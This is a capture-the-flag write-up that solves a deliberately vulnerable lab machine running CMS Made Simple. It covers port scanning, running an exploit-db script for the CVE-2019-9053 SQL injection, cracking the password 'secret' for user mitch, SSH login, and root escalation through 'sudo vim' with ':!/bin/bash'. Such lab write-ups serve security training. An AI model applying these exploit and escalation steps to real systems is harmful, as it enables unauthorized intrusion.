# Solution

Let's start by enumerating the open ports through nmap

```bash
$ nmap -A <url>

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 08:17 EST
Nmap scan report for 10.10.107.172
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.3.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.62 seconds
```

Nmap shows that we have 2 tcp ports open. Port 80 for http, and port 2222 for ssh. From the assignment we see that there should be services running on port 1000. Hence let's check for UDP connections in port 1000.

```
$ sudo nmap -sU -p 1000 <url>

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 08:33 EST

PORT     STATE    SERVICE VERSION
1000/tcp filtered cadlock
```

```
$ sudo nmap -sT -p 1000 <url>

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 08:35 EST
Nmap scan report for 10.10.107.172
Host is up (0.38s latency).

PORT     STATE    SERVICE VERSION
1000/tcp filtered cadlock
```

Now we can answer the following questions
```
How many services are running under port 1000?  2

What is running on the higher port?             ssh
```

Our next assignment requires us to search for an exploit. From the nmap scan, it shows that we have a web server running on port 80. Let's check that out. From first glance, it seems to just be a default Apache file. Let's use `dirbuster` to find any secret folders or files that we can access.

```bash
$ dirbuster &
```

Dirbuster shows us an interesting folder called `/simple`. Access `/simple/index.php` we see that it's actually using a CMS called `CMS Made Simple`. The `index.php` page has a link to an admin page.

So let's try SQL injections.

```bash
$ sqlmap -u http://10.10.107.172/simple/admin/login.php --forms --crawl=2sqlmap
```

Sadly running through all the prompts and going through all the forms doesn't show any promising SQL injections.

What we can do now, is check if there's an actual vulnerability with `CMS Made Simple` using `searchsploit`

```bash
searchsploit CMS Made Simple

----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                               | php/remote/46627.rb
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                          | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                          | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                       | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                           | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                          | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                | php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                                      | php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                             | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                 | php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                                     | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                    | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                              | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                 | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                 | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                    | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                          | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                   | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                 | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                    | php/webapps/44192.txt
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                   | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                     | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                         | php/webapps/48851.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                      | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                     | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                         | php/webapps/49199.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                    | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                    | php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                  | php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                         | php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                 | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                            | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                   | php/webapps/46546.py
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple v2.2.13 - Paper                                                                                  | docs/english/49947-cms-made-simp
----------------------------------------------------------------------------------------------------------------- ---------------------------------
```

There are lots of potential exploits, let's try to narrow it down. From the webpage, we see that it's actually using version `2.2.8`. The only CVE in our list is `CMS Made Simple < 2.2.10 - SQL Injection`. Looks like we're right on the money! Just that we we're looking at it from a wrong angle.

A simple google search leads us to it's CVE, `CVE-2019-9053`.

```
What's the CVE you're using against the application?    CVE-2019-9053
```

Now let's run the script.

```
# Copy the script into our folder
$ cp /usr/share/exploitdb/exploits/php/webapps/46635.py ~/meta

# Create a python environment
$ pyenv virtualenv 2.7.18 meta

# Activate the environment
$ pyenv activate meta

# Install the required dependencies
$ pip install termcolor requests

# Run the script
$ python 46635.py -u http://10.10.107.172/simple --crack -w ../tools/wordlists/rockyou.txt
```

After a few minutes, we get the following values.

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

SSH into the account with username `mitch` and password `secret` at port `2222`

```bash
$ ssh mitch@<url> -p 2222

$ ls
user.txt

$ cat user.txt
G00d j0b, keep up!
```

Our next task is to get root privileges. From the user's directory, we see that there's a .viminfo. Hence thinking that it may be a hint, we can try `sudo vim`.

And success, we are able to run vim without the prompt for a superuser password. Vim like some other text editors in linux allows users to run shell commands. We can spawn an interactive shell using `!/bin/bash`. Then all we have to do is explore the root directory, and print the flag. 

To summarize, here are the final steps:
```
# Try running vim as sudo
sudo vim

# Inside of vim, run the following command
:!/bin/bash

# Profit, we're in
root@Machine:~# 

# Explore the root directory
root@Machine:~# ls -alt /root
total 28
drwx------  4 root root 4096 dec  7 14:53 .
drwxr-xr-x 23 root root 4096 aug 19  2019 ..
drwx------  2 root root 4096 aug 17  2019 .cache
drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
-rw-r--r--  1 root root   24 aug 17  2019 root.txt
-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 aug 17  2015 .profile

# Extra Profit!! Our flag is shown below.
root@Machine:~# cat /root/root.txt
W3ll d0n3. You made it!
```

